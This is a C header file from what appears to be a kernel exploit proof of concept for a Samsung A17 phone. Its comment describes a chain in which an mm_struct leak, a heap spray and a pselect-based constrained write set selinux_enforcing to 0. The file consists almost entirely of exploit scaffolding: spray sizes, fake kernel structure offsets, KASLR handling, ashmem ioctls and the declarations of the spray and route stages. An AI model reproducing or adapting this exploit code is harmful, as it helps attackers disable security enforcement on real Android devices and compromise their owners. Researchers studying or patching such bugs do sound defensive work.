/* ghost_hoock — SELinux-off PoC for Samsung A17 (BZA5, 6.12.23)
 * Forked from GhostLock (MIT). Only the SELinux-disable write path.
 *
 * Flow: KernelSnitch mm_struct leak -> heap spray -> PI route pselect
 *       constrained write -> selinux_enforcing = 0
 */
#ifndef GHOST_HOOCK_H
#define GHOST_HOOCK_H

#define _GNU_SOURCE
#define __ARM 1

#include "offset.h"
#include "runtime_struct_offsets.h"

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE 4096
#define KS_PAGE_MASK 0xfffULL

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/memfd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/utsname.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

/* ---- spray geometry ---- */
#define MM_STRUCT_SZ 0x500
#define MM_ORDER 3
#define MM_PARTIALS 5
#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)

#define KERNEL_PAGE_SETUP_ATTEMPTS 6
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
#define SKB_DATA_DELTA (-0xe80LL)
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#define SKB_RECLAIM_SENDS 4
#define SKB_FRAG_BIAS 0

#define KSNITCH_COLLISIONS 4

/* ---- route / pselect ---- */
extern int g_route_core;
#define CORE g_route_core
#define CONSUMER_CORE (CORE + 1)

#define FAKE_TASK_PRIO 120
#define FAKE_WAITER_PRIO 140
#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
#define FAKE_TASK_UCLAMP_OFF 0x358
#define FAKE_UCLAMP_ACTIVE_BIT 16
#define FAKE_UCLAMP_MIN_ACTIVE (1U << FAKE_UCLAMP_ACTIVE_BIT)
#define FAKE_UCLAMP_MAX_ACTIVE \
  (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT))

#define TASK_COMM_LEN 16

/* ---- ashmem ---- */
#define ASHMEM_NAME_LEN 256
#define __ASHMEMIOC 0x77
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
#define ASHMEM_NAME_PREFIX_LEN 11

/* ---- pselect route knobs ---- */
#define PSELECT_ROUTE_NFDS 320
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_CONSUMER_BURST_CALLS 1
#define PSELECT_ENTER_DELAY_USEC 50000
#define PSELECT_TIMEOUT_SEC 0
#define PSELECT_TIMEOUT_USEC 200000
#define PSELECT_WRITE_SHAPE_DEFAULT 1
#define CONSUMER_MAX_CALLS 1
#define ROUTE_WAIT_SECONDS 1

/* ---- p0 phys profile ---- */
#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))

#define PAGE_PAYLOAD_FOPS 0
#define PAGE_PAYLOAD_SLIDE 1

/* ---- shared structs ---- */
struct mm_ctx {
  size_t mm_cnt;
  pid_t *childs;
  int *memfds;
};

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

/* ---- globals shared between spray.c / route.c / main.c ---- */
extern uintptr_t page_base;
extern uintptr_t last_mm_struct;
extern uintptr_t fake_lock;
extern uintptr_t fake_w0;
extern uintptr_t fake_task;
extern uintptr_t fake_parent;
extern uintptr_t fake_right;
extern uintptr_t fake_left;
extern uintptr_t fake_fops;
extern uintptr_t binwrite_target;

extern int pselect_custom_write;
extern int pselect_child_node;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;

extern uint32_t f_wait;
extern uint32_t f_pi_target;
extern uint32_t f_pi_chain;
extern atomic_int waiter_ready;
extern atomic_int waiter_waiting;
extern atomic_int owner_started;
extern atomic_int owner_chain_done;
extern atomic_int route_done;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int punch_consume_stop;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern atomic_int main_route_delay_usec;
extern int cfi_dirty_seen;
extern int cfi_last_step;
extern int cfi_last_errno;

extern char ashmem_path[256];
extern uint64_t p0_kernel_phys_load;
extern const struct kernel_offsets *active_offsets;

/* KASLR state (defined in spray.c) */
extern uint64_t kaslr_slide;
extern uint64_t kaslr_base;
extern int kaslr_done;

/* ---- spray.c API ---- */
void init_p0_profile(void);
uintptr_t p0_data_alias(uintptr_t image_addr);
uintptr_t data_addr(uintptr_t image_addr);
uintptr_t text_addr(uintptr_t image_addr);
uintptr_t kaslr_image_addr(uintptr_t image_addr);
uintptr_t canon_addr(uintptr_t image_addr);

void put64(unsigned char *p, size_t off, uint64_t value);
void put32(unsigned char *p, size_t off, uint32_t value);

int prepare_skb_payload(uintptr_t base, int payload_mode);
uintptr_t prepare_kernel_page(int payload_mode);
uintptr_t prepare_good_kernel_page(int payload_mode);

pid_t clone_child(void);
pid_t clone_leak_child(void);
int open_memfd(pid_t child);
void kill_child(pid_t child);
int clone_memfd(void);

void init_ashmem_path(void);
int open_ashmem_device(void);

int setup_kernelsnitch_globals(void);
void run_kernelsnitch_bruteforce(void);
int kernelsnitch_collisions_ready(void);
uintptr_t cleanup_kernelsnitch(void);

/* ---- route.c API ---- */
void fdset_put_word(fd_set *set, int word, uint64_t value);
uint64_t fdset_get_word(const fd_set *set, int word);
void open_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
void do_pselect_fake_lock_route(void);

void reset_main_route_state(void);
void run_main_route_threads(void);
void do_one_write(uintptr_t target, const char *desc, int mode);

void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);
int pselect_custom_write_enabled(void);

/* ---- misc ---- */
long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);
void disable_rseq_for_thread(void);
void log_startup_context(void);

int env_flag(const char *name, int def);
int env_int_range(const char *name, int def, int min, int max);

#endif
